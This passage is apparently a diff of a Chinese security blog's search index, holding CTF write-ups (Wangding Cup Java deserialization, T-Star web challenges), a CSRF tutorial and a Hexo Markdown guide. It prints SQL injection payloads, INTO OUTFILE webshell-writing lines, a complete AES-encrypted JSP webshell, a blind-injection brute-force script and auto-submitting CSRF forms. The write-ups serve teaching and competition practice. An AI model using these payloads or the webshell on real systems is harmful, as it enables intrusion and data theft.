class="keyword">res</span> += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> in re<span class="variable">s:</span></span><br><span class="line">        <span class="keyword">print</span> now_key,<span class="keyword">res</span></span><br></pre></td></tr></table></figure>
 
-<p>?后面的字符串都会被当作参数来进行传递，所以当 <code>dbname=&quot;grade?id=1&#39; union select user()#&quot;</code> 时，</p>
-<p><code>1&#39; union select user()#</code> 都被当做id的值，但是不影响数据库的连接，然后在下面执行sql语句的时候  <code>union select user()#</code> 都作为了sql语句执行，达成了sql注入。使用#同理。</p>
-<p>最终输入在swagger-ui.html的/common/test/sqlDict接口中输入<code>myapp#&#39; union select pwd from user#</code>获得密码为 admin@Rrrr_ctf_asde 。</p>
-<h4 id="0x03登录获取token"><a href="#0x03登录获取token" class="headerlink" title="0x03登录获取token"></a>0x03登录获取token</h4><p>在/common/user/login中登录获取到Bearer。</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/login.png" alt="1590733597113">Bearer是用户json数据序列化的结果，将Bearer后面的字符串base64decode的结果如下，明显的java序列化后的格式，这里就可能出现反序列化的漏洞，既然是登录用的，那么就在/common/user/current中应该会触发反序列化，那么在这个接口中的Authorization中输入这一串data，然后Try it out!抓包。</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serialize.png" alt="1590733804094"></p>
-<h4 id="0x04反序列化利用的环境配置"><a href="#0x04反序列化利用的环境配置" class="headerlink" title="0x04反序列化利用的环境配置"></a>0x04反序列化利用的环境配置</h4><p>先在burp中安装  Java Deserialization Scanner插件，该插件在burp的BApp Store可以找到。然后配置ysoserial，先上<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">github</a>下载相关源代码，再使用 <code>mvn clean package -DskipTests</code> 进行编译，最后在burp中的 Java Deserialization Scanner插件下配置路径，例如：</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/ysoserial.png" alt="1590734238883"></p>
-<h4 id="0x05反序列化利用-amp-amp-get-flag"><a href="#0x05反序列化利用-amp-amp-get-flag" class="headerlink" title="0x05反序列化利用&amp;&amp;get flag"></a>0x05反序列化利用&amp;&amp;get flag</h4><p>由于复现是在buuoj下复现的，靶机都处于内网环境，所以先开个小号去申请个内网服务器用来接收shell。</p>
-<p>在burp中，将抓到的包发送到装好的插件中</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/SendRequestToDS.png" alt="1590734455390"></p>
-<p>将Bearer后的字符串 Set Insertion Point，然后Attack(Base64)，在右边可以看到可利用的ROME。</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializePoc.png" alt="1590734607131"></p>
-<p>将当前包发送到Exploiting</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializeExp.png" alt="1590734722286"></p>
-<p>然后构造payload执行，ip端口为buuoj中申请的内网靶机的ip与监听的端口。</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/exp.png" alt="1590734801498"></p>
-<p>最后成功接收到flag</p>
-<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/flag.png" alt="1590734861991"></p>
+<p>觉得这个难？全都在这里：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">点击查看</a><br>关于棋盘加密的知识，以及本题的解密脚本都在里面。</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>T-Star高校挑战赛—by cdusec</title>
+    <url>/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
+    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>又是当废物躺了一天的比赛，10个web做了3个，其余6个都是队友做的，还有一个sql1最后也没做出来。也是第一次在ctf比赛中获得第一，纪念一下，感谢队友带飞。wp写的较为简陋。</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x00_0.png" alt="0x00_0.png"></p>
+<h3 id="0x01-赛题"><a href="#0x01-赛题" class="headerlink" title="0x01 赛题"></a>0x01 赛题</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>就一个前端验证，抓包改后缀就行</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_1.png" alt="0x01_1.png">            </p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_2.png" alt="0x01_2.png">            </p>
+<p>连上shell得到flag</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_3.png" alt="0x01_3.png">            </p>
+<h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>直接用 | 来绕过，成功命令执行</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x02_1.png" alt="0x02_1.png">            </p>
+<h4 id="你能爆破吗？"><a href="#你能爆破吗？" class="headerlink" title="你能爆破吗？"></a>你能爆破吗？</h4><p>sqli-libs 21关原题</p>
+<p>使用admin  admin登录后 查看cookie有个base64编码后的用户名，结合提示知道是注入，将注入语句base64编码后传入。经过测试发现没有过滤，测试出字段数为3。</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_1.png" alt="0x03_1.png">            </p>
+<p>将下列语句base64后传入，查表名：</p>
+<p><code>0&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#</code></p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_2.png" alt="0x03_2.png">            </p>
+<p>将下列语句base64后传入，查列名：</p>
+<p><code>0&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()#</code></p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_3.png" alt="0x03_3.png">            </p>
+<p>查flag</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_4.png" alt="0x03_4.png">            </p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>经过fuzz发现，双写&lt;?和eval可以绕过他的文本替换，然后pht可以上传</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_1.png" alt="0x04_1.png">            </p>
+<p>然后访问发现看不到我们写入的一句话，说明解析成功</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_2.png" alt="0x04_2.png">            </p>
+<p>通过php的system执行命令，得到flag</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_3.png" alt="0x04_3.png">            </p>
+<h4 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h4><p>查看源码，发现了lfi.txt</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_1.png" alt="0x05_1.png">            </p>
+<p>查看lfi.txt，发现可以文件包含           </p>
+<p> <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_2.png" alt="0x05_2.png">            </p>
+<p>准备一个zip文件，里面是s.php，具体如下，并且重命名为s.txt，然后上传</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_3.png" alt="0x05_3.png">            </p>
+<p>通zip协议成功执行命令</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_4.png" alt="0x05_4.png">            </p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_5.png" alt="0x05_5.png"></p>
+<p>​            </p>
+<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>好像是bugku的原题吧，太简单了就不写了</p>
+<p>最后查询flag:</p>
+<p><code>0&#39; union select 1,2,3,flag from fl4g#</code></p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x06_1.png" alt="0x06_1.png">            </p>
+<h4 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h4><p>直接拿poc打，写入一句话</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"pass"</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">""</span>+UUID.randomUUID()).replace(<span class="string">"-"</span>,<span class="string">""</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">"u"</span>,k);out.print(k);<span class="keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">"u"</span>)+<span class="string">""</span>).getBytes(),<span class="string">"AES"</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_1.png" alt="0x07_1.png">            </p>
+<p>然后访问木马，发现写入成功</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_2.png" alt="0x07_2.png">            </p>
+<p>连上一句话，得到flag</p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_3.png" alt="0x07_3.png">            </p>
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_4.png" alt="0x07_4.png">            </p>
+<h4 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h4><p>可能是非预期？反正我们7字符5字符都没成功。</p>
+<p>写入shell基本是不成功的，因为有index.php的干扰，所以用cat命令读上一级目录的key，先写入cat</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_1.png" alt="0x08_1.png"></p>
+<p>然后看到key是在上层目录</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_2.png" alt="0x08_2.png"></p>
+<p>然后直接使用cat来读取 <code>* ../*</code></p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_3.png" alt="0x08_3.png"></p>
+<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>这里听群里的师傅说是limit注入写文件，查了一下官方文档</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_1.png" alt="0x10_1.png"></p>
+<p>在设置了secure_file_priv的情况下，就可以直接写shell了，猜一个路径(通常就是/var/www/html)</p>
+<p>贴几个payload。</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines terminated <span class="keyword">by</span>  （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> fields terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> <span class="keyword">columns</span> terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines starting <span class="keyword">by</span>    （一句话hex编码）</span><br></pre></td></tr></table></figure>
+
+<p>至于某群友说低版本才行，经过查阅文档发现都行，上图就是mysql8.0的文档，所以总结就是只要能够写文件，就能limit后面进行注入(有错误的话欢迎师傅们指正)。</p>
+<p>以下为测试的两个版本，只需要开启secure-file-priv以及有写的权限就可以进行limit写shell了</p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_2.png" alt="0x10_2.png"></p>
+<p> <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_3.png" alt="0x10_3.png"> </p>
+<h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>目录扫描到wwwroot.zip，发现过滤的比较死，猜测账号密码图片都在同一个数据库表中，脚本如下。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="selector-tag">a</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="title">while</span><span class="params">(<span class="number">1</span>)</span></span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="selector-tag">a</span>:</span><br><span class="line">        url = <span class="string">'http://23dcf1dc.yunyansec.com/picture.php?id=3" or password REGEXP '</span>+<span class="string">'\'^'</span>+temp+i+<span class="string">'\' %23'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'not found'</span> not <span class="keyword">in</span> r<span class="selector-class">.text</span>:</span><br><span class="line">            temp = temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_1.png" alt="0x09_1.png">            </p>
+<p> 二十位的hash？可能是dedecms，然后去掉前三位跟后三位然后somd5解密 </p>
+<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_2.png" alt="0x09_2.png"></p>
+<p> 然后登陆拿到flag </p>
+<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>总体来说还算比较简单，早期起来晚了，要不然还能抢几个题，等我起来一上号队友都已经在屠榜了(淦</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何写一篇hexo博客</title>
+    <url>/2018/09/04/%E5%A6%82%E4%BD%95%E5%86%99hexo%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>本文介绍如何使用Hexo写出一篇‘比较’好看的文章，几句简单的语法，喜欢简介的话，可能就刚好适用。</p>
+<a id="more"></a>
+
+<hr>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote>
+<p>这是一个引用,使用&gt;符号，置于文本前。(为方便阅读，下面的内容均使用了引用)</p>
+</blockquote>
+<hr>
+<h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><blockquote>
+<p>图片：！[](图片地址)</p>
+</blockquote>
+<blockquote>
+<p>网址：[]()</p>
+</blockquote>
+<hr>
+<h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><blockquote>
+<p>粗体：用两个*包含一段文本就是粗体。    例：<strong>粗体</strong></p>
+</blockquote>
+<blockquote>
+<p>斜体：用一个*包含一段文本就是斜体</p>
+</blockquote>
+<hr>
+<h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><blockquote>
+<p>使用两个`把中间的代码包含起来，例如：</p>
+</blockquote>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hello <span class="built_in">word</span>!</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><blockquote>
+<p>分割线的语法只需要加三个-号或*(是不是发现一直再用分割线hhh<del>~</del>)</p>
+</blockquote>
+<hr>
+]]></content>
+      <tags>
+        <tag>hexo学习</tag>
       </tags>
   </entry>
   <entry>
@@ -489,6 +335,26 @@
 ]]></content>
       <tags>
         <tag>web FE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初探csrf以及如何利用</title>
+    <url>/2019/01/16/%E5%88%9D%E6%8E%A2csrf%E4%BB%A5%E5%8F%8A%E7%AC%AC%E4%B8%80%E4%B8%AAcsrf%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>csrf学过有很长一段时间了，之前也就简单的知道这个是什么东西，大概是怎么实现，没有亲自挖掘到过，有幸的是在上周挖掘到两个，这里小小的记录一下</p>
+<a id="more"></a>
+
+<h3 id="1-csrf是什么？"><a href="#1-csrf是什么？" class="headerlink" title="1.csrf是什么？"></a>1.csrf是什么？</h3><p>在我个人的理解中，通过制造恶意链接，诱导在登陆某个web站点的时候请求了该恶意链接，而造成了以为用户并不想做的操作。例如添加/删除收获地址，改密码，修改个人信息等等。   </p>
+<h3 id="2-怎么实现跟利用"><a href="#2-怎么实现跟利用" class="headerlink" title="2.怎么实现跟利用?"></a>2.怎么实现跟利用?</h3><p>举个例子：在某个网站我们进行添加收获地址的操作时，向服务器发送了以下请求</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get请求为：</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//aimsite.com?add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//post的数据为：</span></span><br><span class="line">name=xiaoming<span class="variable">&amp;phone</span>=<span class="number">13888888888</span><span class="variable">&amp;home</span>=chengdu</span><br></pre></td></tr></table></figure>
+
+<p>在没有防御的情况下，可以构造以下表单：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-怎么实现点击链接就能提交？"><a href="#3-怎么实现点击链接就能提交？" class="headerlink" title="3.怎么实现点击链接就能提交？"></a>3.怎么实现点击链接就能提交？</h3><p>加入一段小小的js代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">autosubmit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).submit();</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.load=autosubmit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
@@ -600,6 +466,45 @@
 ]]></content>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网鼎杯-朱雀组-Web复现wp</title>
+    <url>/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/</url>
+    <content><![CDATA[<h3 id="Think-Java"><a href="#Think-Java" class="headerlink" title="Think Java"></a>Think Java</h3><p>本题花时间也比较多，复现的时候遇到的坑也比较多，以下是解题方法与细节理解。</p>
+<h4 id="0x01-源代码分析"><a href="#0x01-源代码分析" class="headerlink" title="0x01 源代码分析"></a>0x01 源代码分析</h4><p>根据给的文件可以发现存在sql注入，dbName可控，此外在Test.class中发现了swagger，访问后发现开放了相关接口。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.core.sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SqlDict</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/"</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/myapp"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                user = <span class="string">"root"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                pass = <span class="string">"abc@12345"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">   